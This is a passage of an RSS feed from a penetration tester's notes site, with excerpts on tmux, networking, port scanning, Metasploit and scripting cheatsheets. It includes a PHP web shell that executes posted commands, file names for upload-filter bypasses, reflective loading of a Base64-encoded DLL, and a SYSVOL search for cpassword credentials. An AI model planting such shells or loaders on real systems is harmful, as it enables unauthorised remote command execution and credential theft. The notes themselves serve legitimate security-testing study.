tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill In tmux, hit the prefix ctrl+b (my modified prefix is ctrl+a) and then:</description></item><item><title>Layer 3</title><link>https://notes.justin-p.me/notes/networking/osi-model/layer3/</link><pubDate>Tue, 10 Mar 2020 16:33:40 +0100</pubDate><guid>https://notes.justin-p.me/notes/networking/osi-model/layer3/</guid><description>Layer 3 Num 3 Name Network Acronim Not PDU Packet What is &amp;lsquo;on it&amp;rsquo; Router Function Structuring and managing a multi-node network, including addressing, routing and traffic control Network layer works for the transmission of data from one host to the other located in different networks. It also takes care of packet routing i.</description></item><item><title>PHP</title><link>https://notes.justin-p.me/cheatsheets/programming/php/</link><pubDate>Tue, 10 Mar 2020 16:33:40 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/programming/php/</guid><description>PHP Simple webshell Attachments .gitkeep (0 kb) simple_shell.php (0 kb) simple_shell.php%00.gif (0 kb) simple_shell_magic_byte.jpg.php (0 kb) &amp;lt;!-- By justin-p (https://github.com/justin-p) based of https://github.com/artyuum/Simple-PHP-Web-Shell/ --&amp;gt;
&amp;lt;?php if (empty($_POST['cmd'])) {$cmd = &amp;quot;&amp;quot;;} elseif (!empty($_POST['cmd'])) {$cmd = shell_exec($_POST['cmd']);} ?&amp;gt;
&amp;lt;form method=&amp;quot;POST&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; style=&amp;quot;width:100%;height:25px;&amp;quot; name=&amp;quot;cmd&amp;quot; id=&amp;quot;cmd&amp;quot; value=&amp;quot;&amp;lt;?php if (!empty($_POST['cmd'])) {htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8');} ?&amp;gt;&amp;quot; required&amp;gt;&amp;lt;button type=&amp;quot;submit&amp;quot; class=&amp;quot;btn btn-primary&amp;quot;&amp;gt;Execute&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;
&amp;lt;?</description></item><item><title>PowerShell</title><link>https://notes.justin-p.me/cheatsheets/programming/powershell/</link><pubDate>Tue, 10 Mar 2020 16:33:40 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/programming/powershell/</guid><description>PowerShell Base64 Encode DLL $Path = &amp;quot;$PSScriptRoot\TotallyNotMalware.dll&amp;quot;
$bytes = [System.IO.File]::ReadAllBytes($Path)
$string = [System.Convert]::ToBase64String($bytes)
Copy something to clipboard $string | Set-Clipboard
Load Base64 Encoded DLL $dll = 'TVqQAAMAAAAEAAAA//8AALgAAAAA...'
$bytes = [System.Convert]::FromBase64String($dll)
[System.Reflection.Assembly]::Load($bytes)
Easy way to create an object function Add2Obj {
param (
$FirstName,
$LastName
)
return (New-Object psobject -Property @{FirstName=$FirstName;LastName=$LastName;})
}
$Names = @()
$Names += Add2Obj -FirstName &amp;quot;Justin&amp;quot; -LastName &amp;quot;Perdok&amp;quot;
&amp;lt;#
PS&amp;gt; $Names
LastName FirstName
-------- ---------
Perdok Justin
#&amp;gt;
Search NETLOGON/SYSVOL for cpassword Get-ChildItem | Where-Object {$_.</description></item><item><title>Python</title><link>https://notes.justin-p.me/cheatsheets/programming/python/</link><pubDate>Tue, 10 Mar 2020 16:33:40 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/programming/python/</guid><description>Python Oneliners HTTP Start a webserver that hosts the current pwd.
Python2 Python3 python -m SimpleHTTPServer 8000 python3 -m http.server 8000 FTP Start a ftp that hosts the current pwd, allows writing and is protected by a username/password.
Install
pip3 install pyftpdlib
Python2 Python3 python -m pyftpdlib -p 21 -w --user=username --password=password python3 -m pyftpdlib -p 21 -w --user=username --password=password unicode character Print a unicode character</description></item><item><title>Configs</title><link>https://notes.justin-p.me/notes/networking/configs/</link><pubDate>Tue, 10 Mar 2020 16:33:39 +0100</pubDate><guid>https://notes.justin-p.me/notes/networking/configs/</guid><description>Configs See github</description></item><item><title>Discover Open Ports</title><link>https://notes.justin-p.me/notes/methodology/general/port-scanning/</link><pubDate>Tue, 10 Mar 2020 16:33:38 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/port-scanning/</guid><description>Discover Open Ports In order to start testing something you first want to find out if it has any network ports open. Discovering what ports are open and what service is running behind is crucial and should be one of the first things you do after recon.
MOVE TO OWN TOOLS PAGE netdiscover Uses ARP to discover hosts.
netdiscover -r 192.168.1.0/24 MOVE TO OWN TOOLS PAGE masscan Usefull on larger networks where speed is important.</description></item><item><title>Metasploit</title><link>https://notes.justin-p.me/cheatsheets/tools/metasploit/</link><pubDate>Tue, 10 Mar 2020 16:33:38 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/metasploit/</guid><description>Metasploit Install Easiest way is to use Kali/Parrot and install from repo
apt install metasploit-framework
otherwise download from
https://github.com/rapid7/metasploit-framework/releases
Usage msfconsole [options]
Flags Common options:
-E, --environment ENVIRONMENT Set Rails environment, defaults to RAIL_ENV environment variable or 'production'
Database options:
-M, --migration-path DIRECTORY Specify a directory containing additional DB migrations
-n, --no-database Disable database support
-y, --yaml PATH Specify a YAML file containing database settings
Framework options:
-c FILE Load the specified configuration file
-v, -V, --version Show version
Module options:
--defer-module-loads Defer module loading unless explicitly asked.</description></item></channel></rss>